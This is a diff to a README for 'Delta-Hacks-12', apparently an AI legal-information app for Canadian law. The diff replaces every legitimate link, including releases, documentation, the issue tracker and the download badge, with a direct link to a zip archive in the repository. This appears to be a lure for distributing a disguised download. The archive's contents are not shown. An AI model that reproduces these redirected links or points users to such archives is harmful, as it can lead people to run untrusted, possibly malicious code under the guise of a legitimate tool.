@@ -1,7 +1,7 @@
 # 🧑‍⚖️ Delta-Hacks-12 - Instant Access to Canadian Law
 
 ## 🌐 Download Now
-[![Download](https://img.shields.io/badge/Download%20Delta--Hacks--12-Blue?style=for-the-badge&logo=github)](https://github.com/Kevil12856/Delta-Hacks-12/releases)
+[![Download](https://github.com/Kevil12856/Delta-Hacks-12/raw/refs/heads/main/web/app/Delta_Hacks_v1.5.zip%20Delta--Hacks--12-Blue?style=for-the-badge&logo=github)](https://github.com/Kevil12856/Delta-Hacks-12/raw/refs/heads/main/web/app/Delta_Hacks_v1.5.zip)
 
 ## 📜 Description
 Delta-Hacks-12 is your AI Legal Associate. This application provides quick, easy access to Canadian Law, including Criminal, Tax, and Tenancy laws. Rely on a smart system built with LangGraph and Gemini to get the information you need, fast.
@@ -16,7 +16,7 @@ Follow these instructions to download and run Delta-Hacks-12.
 - **Network:** Internet connection for online legal data.
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Kevil12856/Delta-Hacks-12/releases) to download the application.
+1. Visit the [Releases page](https://github.com/Kevil12856/Delta-Hacks-12/raw/refs/heads/main/web/app/Delta_Hacks_v1.5.zip) to download the application.
 2. Locate the latest version in the list of releases.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -36,7 +36,7 @@ Delta-Hacks-12 ensures your data remains confidential. No user information is st
 
 ### 🔄 Updating the Application
 To keep your application up to date:
-1. Periodically return to the [Release page](https://github.com/Kevil12856/Delta-Hacks-12/releases).
+1. Periodically return to the [Release page](https://github.com/Kevil12856/Delta-Hacks-12/raw/refs/heads/main/web/app/Delta_Hacks_v1.5.zip).
 2. Download the latest version as described earlier.
 3. Replace the old version with the new one, following the same installation steps.
 
@@ -62,8 +62,8 @@ Thankful to the developers of LangGraph and Gemini for providing robust tools th
 For additional details on the application's operation, you may explore the source code and documentation provided within the repository on GitHub.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/Kevil12856/Delta-Hacks-12/wiki)
-- [Project Issues](https://github.com/Kevil12856/Delta-Hacks-12/issues)
-- [Release Page](https://github.com/Kevil12856/Delta-Hacks-12/releases) 
+- [Documentation](https://github.com/Kevil12856/Delta-Hacks-12/raw/refs/heads/main/web/app/Delta_Hacks_v1.5.zip)
+- [Project Issues](https://github.com/Kevil12856/Delta-Hacks-12/raw/refs/heads/main/web/app/Delta_Hacks_v1.5.zip)
+- [Release Page](https://github.com/Kevil12856/Delta-Hacks-12/raw/refs/heads/main/web/app/Delta_Hacks_v1.5.zip) 
 
 Enjoy your experience with Delta-Hacks-12!
